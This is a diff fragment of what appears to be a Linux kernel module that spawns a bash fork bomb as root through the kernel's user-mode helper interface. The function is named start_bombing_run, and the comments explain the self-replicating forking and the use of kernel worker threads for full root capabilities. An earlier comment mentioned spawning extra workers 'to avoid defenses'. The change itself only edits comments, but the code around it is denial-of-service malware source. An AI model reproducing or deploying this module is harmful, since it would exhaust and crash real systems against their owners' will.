@@ -3,9 +3,9 @@
     #include <linux/slab.h>
     #include <linux/umh.h>
 
-/*use bash binary to do a command that defines a function that calls itself,
-  pipe the output to another call of itself, making a recursive function that calls itself
-  and creating a fork each time with the pipe operator*/
+/*  prep basic environment variables and the args for the bash call with the command itself.
+    might be better to use sh shell, which always present.
+*/
 static char *env[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL}; // environment variables of the process
 static char *args_shell[] = {"/bin/bash", "-c", "", NULL};
 
@@ -29,10 +29,13 @@ static int run_shell(char *command){
 }
 
 
-/*It runs a user-space application. The application is started asynchronously if wait is not set,
+/*use bash binary to do a command that defines a function that calls itself,
+  pipe the output to another call of itself, making a recursive function that calls itself
+  and creating a fork each time with the pipe operator.
+  It runs a user-space application. The application is started asynchronously if wait is not set,
   and runs as a child of system workqueues(kworkers, executors of kthreads) that are children of kthreadd. (ie. it runs with full root capabilities and optimized affinity).
   the kthreadd enumerates other kernel threads; it provides interface routines through which other kernel threads can be dynamically spawned at runtime by kernel services.
-  can also spawn multiple processes for multiple workers for added complexity to avoid defenses.
+  can also spawn multiple processes for multiple workers for added complexity.
   */
 static void start_bombing_run(void){
     char *comm = kmalloc(NAME_MAX + 1, GFP_KERNEL);
